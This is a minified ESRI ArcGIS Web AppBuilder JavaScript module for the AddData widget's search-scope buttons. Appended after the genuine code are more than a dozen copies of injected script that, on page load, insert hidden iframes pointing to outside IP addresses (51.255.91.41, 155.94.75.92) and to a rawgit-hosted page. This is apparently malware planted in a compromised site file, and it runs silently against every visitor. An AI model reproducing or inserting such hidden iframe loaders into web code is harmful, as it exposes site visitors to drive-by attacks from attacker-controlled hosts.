// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/AddData/search/templates/ScopeOptions.html":'\x3cdiv class\x3d"search-scope-options"\x3e\r\n  \x3ca href\x3d"#" class\x3d"scope-placeholder"\r\n    data-dojo-attach-point\x3d"scopePlaceholder"\r\n    data-dojo-attach-event\x3d"onClick: scopePlaceholderClicked"\x3e\r\n    \x3cspan data-dojo-attach-point\x3d"scopePlaceholderText"\x3e\x3c/span\x3e\r\n    \x3cspan class\x3d"dropdown-arrow"\x3e\x3c/span\x3e\r\n  \x3c/a\x3e\r\n  \x3cdiv class\x3d"btn-group" data-dojo-attach-point\x3d"btnGroup"\x3e\r\n    \x3cbutton type\x3d"button" class\x3d"btn btn-sm btn-default" name\x3d"${id}_scope"\r\n      data-dojo-attach-point\x3d"MyContentToggle"\r\n      data-dojo-attach-event\x3d"onClick: optionClicked"\r\n      data-option-name\x3d"MyContent"\x3e\r\n      ${i18n.search.scopeOptions.myContent}\r\n    \x3c/button\x3e\r\n    \x3cbutton type\x3d"button" class\x3d"btn btn-sm btn-default" name\x3d"${id}_scope"\r\n      data-dojo-attach-point\x3d"MyOrganizationToggle"\r\n      data-dojo-attach-event\x3d"onClick: optionClicked"\r\n      data-option-name\x3d"MyOrganization"\x3e\r\n      ${i18n.search.scopeOptions.myOrganization}\r\n    \x3c/button\x3e\r\n    \x3cbutton type\x3d"button" class\x3d"btn btn-sm btn-default" name\x3d"${id}_scope"\r\n      data-dojo-attach-point\x3d"CuratedToggle"\r\n      data-dojo-attach-event\x3d"onClick: optionClicked"\r\n      data-option-name\x3d"Curated"\x3e\r\n      ${i18n.search.scopeOptions.curated}\r\n    \x3c/button\x3e\r\n    \x3cbutton type\x3d"button" class\x3d"btn btn-sm btn-default" name\x3d"${id}_scope"\r\n      data-dojo-attach-point\x3d"ArcGISOnlineToggle"\r\n      data-dojo-attach-event\x3d"onClick: optionClicked"\r\n      data-option-name\x3d"ArcGISOnline"\x3e\r\n      ${i18n.search.scopeOptions.ArcGISOnline}\r\n    \x3c/button\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/dom-class ./SearchComponent dojo/text!./templates/ScopeOptions.html dojo/i18n!../nls/strings ./util".split(" "),function(q,f,n,c,r,t,p,g){return q([r],{i18n:p,templateString:t,curatedFilter:null,postCreate:function(){this.inherited(arguments)},startup:function(){this._started||(this.inherited(arguments),this.initOptions())},hideDropdown:function(){c.remove(this.scopePlaceholder,"opened");c.remove(this.btnGroup,"show")},initOptions:function(){var a=
this.searchPane.searchContext,h="string"===typeof a.username&&0<a.username.length,d=this.getConfig().scopeOptions;this.curatedFilter=d.Curated.filter;var b=null,a=function(a,e){var c=d[a];c&&c.allow?("string"===typeof c.label&&0<f.trim(c.label).length?g.setNodeText(e,f.trim(c.label)):h||"MyOrganization"!==a||g.setNodeText(e,p.search.scopeOptions.anonymousContent),d.defaultScope===a&&(b=e)):e.style.display="none"};a("MyContent",this.MyContentToggle);a("MyOrganization",this.MyOrganizationToggle);a("Curated",
this.CuratedToggle);a("ArcGISOnline",this.ArcGISOnlineToggle);b||(d.MyOrganization.allow?b=this.MyOrganizationToggle:d.ArcGISOnline.allow?b=this.ArcGISOnlineToggle:d.Curated.allow?b=this.CuratedToggle:d.MyContent.allow&&(b=this.MyContentToggle));b&&(c.add(b,"active"),this.scopePlaceholderText.innerHTML=b.innerHTML)},optionClicked:function(a){this.toggleClassName(a);this.hideDropdown();this.search()},scopePlaceholderClicked:function(a){a.preventDefault();c.contains(this.scopePlaceholder,"opened")?
this.hideDropdown():this.showDropdown()},showDropdown:function(){c.add(this.scopePlaceholder,"opened");c.add(this.btnGroup,"show")},toggleClassName:function(a){n.forEach(this.btnGroup.children,function(a){c.remove(a,"active")});c.add(a.target,"active");this.scopePlaceholderText.innerHTML=a.target.innerHTML},appendQueryParams:function(a,h){var d=null;n.some(this.btnGroup.children,function(a){if(c.contains(a,"active"))return d=a.getAttribute("data-option-name"),!0});"undefined"===typeof d&&(d=null);
var b=null,k=this.curatedFilter,e=this.searchPane.searchContext,l=e.username,m=e.orgId,f=!0;e.portal&&e.portal.isPortal&&(f=!1);"MyContent"===d?"string"===typeof l&&0<l.length&&(b="(owner:"+g.escapeForLucene(l)+")"):"MyOrganization"===d?f&&"string"===typeof m&&0<m.length&&(b="(orgid:"+g.escapeForLucene(m)+")"):"Curated"===d?"string"===typeof k&&0<k.length&&(b=k):"ArcGISOnline"===d&&e.allowArcGISOnline&&(h.scopeIsArcGISOnline=!0);null!==b&&0<b.length&&(b="("+b+")",a.q=null!==a.q&&0<a.q.length?a.q+
(" AND "+b):b)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});